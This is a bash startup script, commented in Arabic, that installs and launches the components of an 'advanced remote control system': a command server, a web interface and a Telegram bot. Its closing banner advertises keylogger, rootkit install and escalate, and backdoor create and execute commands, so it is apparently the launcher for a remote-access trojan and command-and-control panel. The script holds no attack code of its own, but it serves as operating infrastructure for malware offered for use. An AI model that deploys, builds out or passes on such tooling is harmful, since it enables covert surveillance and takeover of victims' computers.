#!/bin/bash

# 🚀 نظام التحكم عن بعد المتقدم v2.0.0
# سكريبت التشغيل

echo "🚀 بدء تشغيل نظام التحكم عن بعد المتقدم v2.0.0"
echo "=================================================="

# التحقق من وجود Node.js
if ! command -v node &> /dev/null; then
    echo "❌ Node.js غير مثبت. يرجى تثبيت Node.js أولاً."
    exit 1
fi

# التحقق من وجود Python
if ! command -v python3 &> /dev/null; then
    echo "❌ Python3 غير مثبت. يرجى تثبيت Python3 أولاً."
    exit 1
fi

# التحقق من وجود npm
if ! command -v npm &> /dev/null; then
    echo "❌ npm غير مثبت. يرجى تثبيت npm أولاً."
    exit 1
fi

echo "✅ تم التحقق من المتطلبات الأساسية"

# إنشاء مجلد السجلات
mkdir -p logs
mkdir -p data

# تثبيت التبعيات
echo "📦 تثبيت تبعيات خادم الأوامر..."
cd command-server
npm install
cd ..

echo "📦 تثبيت تبعيات واجهة الويب..."
cd web-interface
npm install
cd ..

echo "📦 تثبيت تبعيات بوت تيليجرام..."
cd telegram-bot
pip3 install -r requirements.txt
cd ..

# التحقق من متغيرات البيئة
if [ -z "$TELEGRAM_BOT_TOKEN" ]; then
    echo "⚠️ تحذير: متغير TELEGRAM_BOT_TOKEN غير محدد"
    echo "يرجى تعيينه قبل تشغيل البوت:"
    echo "export TELEGRAM_BOT_TOKEN='your_bot_token_here'"
fi

# إنشاء ملف PID للتحكم في العمليات
echo $$ > .system.pid

# دالة تنظيف عند الإيقاف
cleanup() {
    echo ""
    echo "🛑 إيقاف النظام..."
    
    # إيقاف جميع العمليات
    if [ -f .command-server.pid ]; then
        kill $(cat .command-server.pid) 2>/dev/null
        rm -f .command-server.pid
    fi
    
    if [ -f .web-interface.pid ]; then
        kill $(cat .web-interface.pid) 2>/dev/null
        rm -f .web-interface.pid
    fi
    
    if [ -f .telegram-bot.pid ]; then
        kill $(cat .telegram-bot.pid) 2>/dev/null
        rm -f .telegram-bot.pid
    fi
    
    rm -f .system.pid
    
    echo "✅ تم إيقاف النظام بنجاح"
    exit 0
}

# ربط دالة التنظيف بإشارات الإيقاف
trap cleanup SIGINT SIGTERM

# تشغيل خادم الأوامر
echo "🚀 تشغيل خادم الأوامر..."
cd command-server
nohup node server.js > ../logs/command-server.log 2>&1 &
echo $! > ../.command-server.pid
cd ..

# انتظار قليل لبدء خادم الأوامر
sleep 3

# تشغيل واجهة الويب
echo "🌐 تشغيل واجهة الويب..."
cd web-interface
nohup node server.js > ../logs/web-interface.log 2>&1 &
echo $! > ../.web-interface.pid
cd ..

# انتظار قليل لبدء واجهة الويب
sleep 2

# تشغيل بوت تيليجرام
echo "🤖 تشغيل بوت تيليجرام..."
cd telegram-bot
nohup python3 bot.py > ../logs/telegram-bot.log 2>&1 &
echo $! > ../.telegram-bot.pid
cd ..

echo ""
echo "✅ تم تشغيل جميع المكونات بنجاح!"
echo ""
echo "📊 معلومات النظام:"
echo "  🔧 خادم الأوامر: http://localhost:10001"
echo "  🌐 واجهة الويب: http://localhost:3000"
echo "  🤖 بوت تيليجرام: يعمل في الخلفية"
echo ""
echo "📋 الأوامر المتقدمة المدعومة:"
echo "  🔑 /keylogger start|stop|data"
echo "  🔧 /rootkit install|escalate|hide"
echo "  🚪 /backdoor create|execute|transfer"
echo "  💻 /system info|control|monitor"
echo ""
echo "📁 السجلات:"
echo "  📄 logs/command-server.log"
echo "  📄 logs/web-interface.log"
echo "  📄 logs/telegram-bot.log"
echo ""
echo "🛑 للإيقاف: اضغط Ctrl+C أو شغل ./stop.sh"
echo ""

# عرض حالة العمليات
echo "📊 حالة العمليات:"
sleep 2

if [ -f .command-server.pid ] && kill -0 $(cat .command-server.pid) 2>/dev/null; then
    echo "  ✅ خادم الأوامر: يعمل (PID: $(cat .command-server.pid))"
else
    echo "  ❌ خادم الأوامر: متوقف"
fi

if [ -f .web-interface.pid ] && kill -0 $(cat .web-interface.pid) 2>/dev/null; then
    echo "  ✅ واجهة الويب: تعمل (PID: $(cat .web-interface.pid))"
else
    echo "  ❌ واجهة الويب: متوقفة"
fi

if [ -f .telegram-bot.pid ] && kill -0 $(cat .telegram-bot.pid) 2>/dev/null; then
    echo "  ✅ بوت تيليجرام: يعمل (PID: $(cat .telegram-bot.pid))"
else
    echo "  ❌ بوت تيليجرام: متوقف"
fi

echo ""
echo "🎯 النظام جاهز للاستخدام!"
echo "=================================================="

# انتظار إشارة الإيقاف
wait